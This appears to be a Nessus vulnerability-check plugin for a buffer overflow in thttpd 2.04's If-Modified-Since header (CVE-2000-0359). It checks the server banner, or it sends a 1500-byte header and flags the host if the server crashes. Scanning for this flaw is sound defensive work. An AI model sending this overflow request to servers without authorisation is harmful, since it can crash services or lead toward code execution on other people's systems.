#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10285);
 script_bugtraq_id(1248);
 script_version ("$Revision: 1.23 $");
 script_cve_id("CVE-2000-0359");
 
 name["english"] = "thttpd 2.04 buffer overflow";
 name["francais"] = "Dépassement de buffer dans thttpd 2.04";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It is possible to make the remote thttpd server execute
arbitrary code by sending a request like :

	GET / HTTP/1.0
	If-Modified-Since: AAA[...]AAAA
	
An attacker may use this to gain control on your computer.

Solution : if you are using thttpd, upgrade to version 2.05. If you
           are not, then contact your vendor and ask for a patch,
	   or change your web server
Risk factor : High";

 desc["francais"] = "Il est possible de faire executer du code arbitraire
à un serveur faisant tourner thttpd en lui envoyant :

	GET / HTTP/1.0
	If-Modified-Since: AAA[...]AAA
	
Un pirate peut utiliser ce problème pour obtenir un shell
sur ce système.

Solution : Si vous utilisez thttpd, upgradez en version 2.05, sinon
	   contactez votre vendeur et demandez un patch, ou changez
	   de serveur web

Facteur de risque : Elevé.";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "thttpd buffer overflow";
 summary["francais"] = "Dépassement de buffer dans thhtpd";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "www_too_long_url.nasl", "http_version.nasl");
 script_exclude_keys("www/too_long_url_crash");
 script_require_keys("www/thttpd");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);


if(safe_checks())
{
 banner = get_http_banner(port: port);
 if(banner)
 {
   if(egrep(pattern:"^Server: thttpd/2\.0[0-4]",
   	    string:banner))
	    {
	     alrt = "
The remote thttpd server is vulnerable to
a buffer overflow when issued a too long 
argument to the 'If-Modified-Since' HTTP field.

An attacker may use this flaw to execute arbitrary
code on this host.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : Upgrade to thttpd 2.05 or newer
Risk factor : High";	     
	     security_hole(port:port, data:alrt);
	    }
  }
 exit(0);
}

if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 soc = http_open_socket(port);
 if(soc > 0)
 {
 data = http_get(item:"/", port:port);
 data = data - string("\r\n\r\n");
 data = data + string("\r\nIf-Modified-Since: ", crap(1500), "\r\n\r\n");
 send(socket:soc, data:data);
 r = http_recv(socket:soc);
 http_close_socket(soc);

 if(http_is_dead(port:port))security_hole(port);
 }
}
